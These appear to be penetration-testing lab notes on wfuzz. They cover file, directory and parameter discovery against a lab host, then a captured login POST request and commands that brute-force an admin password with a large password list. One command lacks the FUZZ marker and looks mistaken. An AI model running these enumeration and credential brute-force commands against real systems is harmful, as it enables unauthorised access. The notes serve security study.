# Wfuzz

export URL="http://zda:80/FUZZ"


File Discovery

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"
```

Directory Discovery

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 403,404 "$URL" 


Parameter Discovery - check for files on the webserver that can be used maliciously

export URL="http://zda:80/index.php?FUZZ=data"


fuzzing parameter values on a target web app
fuzzing the "fpv" parameter with a common wordlist 


wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://zda:80/index.php?fpv=FUZZ


Fuzz the password in Burp


POST /goform/formLogin HTTP/1.1
Host: 192.168.233.45
Content-Length: 64
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.233.45
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.233.45/index.asp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

HtmlOnly=true&Login=admin&Password=dawg&loginButton=Submit+Login


RUn this command

wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404  -d "Login=admin&Password=dawg" http://192.168.233.45/index.asp

you can restrict file size of th erequest to remove erronious responses wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404  -d "Login=admin&Password=FUZZ" --hh 229 http://192.168.233.45:80/goform/formLogin

https://www.phrack.me/tools/2022/07/06/Ffuf-cheatsheet.html

